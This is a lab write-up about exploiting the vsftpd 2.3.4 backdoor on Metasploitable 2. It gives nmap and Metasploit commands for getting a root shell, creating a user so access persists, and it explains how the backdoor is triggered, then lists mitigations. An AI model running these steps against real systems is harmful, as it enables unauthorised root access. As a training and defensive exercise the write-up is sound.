# vsftpd 2.3.4 Backdoor

**Technique:** FTP backdoor exploitation  
**Tools:** Nmap, Metasploit  
**Target:** Metasploitable 2 (closed lab network)

---

## Objective

- Confirm the vulnerable vsftpd 2.3.4 version on port 21
- Exploit the built-in backdoor to obtain a root shell
- Verify persistent lab access by creating and logging in as a new user

## Setup

| Role | System |
|------|--------|
| Attacker | Kali Linux |
| Target | Metasploitable 2 (local lab network) |

---

## Walkthrough

### 1. Service discovery — vsftpd 2.3.4 on port 21

```bash
nmap -sV -T4 -p- 192.168.x.x
```

![Nmap scan — vsftpd 2.3.4 detected](images/img_00.jpeg)

Full scan output:

![Full Nmap scan](images/img_01.jpeg)

---

### 2. Metasploit — backdoor module selected

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.x.x
```

![Metasploit vsftpd module options](images/img_02.jpeg)

---

### 3. Exploit executed — root shell obtained

```bash
exploit
whoami   # → root
```

![Root shell via backdoor](images/img_03.jpeg)

---

### 4. New lab user created for persistent access

```bash
useradd -m labuser
passwd labuser
```

![User creation and password set](images/img_04.jpeg)

---

### 5. Login verified with new user

![Successful login with new user](images/img_05.jpeg)

---

## Key Takeaways

- Discovery → exploitation → verification: a clean, pedagogical chain from vulnerable service to full control
- Small version details in legacy services can expose full system access
- The vsftpd 2.3.4 backdoor triggers on a username ending in `:)` — spawning a shell on port 6200/tcp

## Mitigations

- Remove or upgrade vsftpd 2.3.4 immediately
- Close unused ports; monitor unexpected traffic on port 6200/tcp
- Establish patch routines and binary integrity checks for all running services

---

## Disclaimer

Performed in a closed lab environment. Sensitive details are masked in screenshots.

[← Back to overview](../README.md)
